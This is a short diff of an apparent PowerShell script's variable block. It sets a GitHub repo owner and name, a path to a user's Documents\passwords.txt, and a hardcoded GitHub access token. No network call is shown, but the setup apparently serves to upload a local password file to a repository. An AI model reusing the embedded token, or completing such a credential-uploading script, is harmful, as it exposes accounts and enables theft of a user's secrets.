@@ -1,6 +1,6 @@
 # Define variables
 $RepoOwner = "tomasgit17"
-$RepoName = "files"
+$RepoName = "tomasgit17/files"
 $FilePath = "$env:USERPROFILE\Documents\passwords.txt"
 $GitHubToken = "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"
 
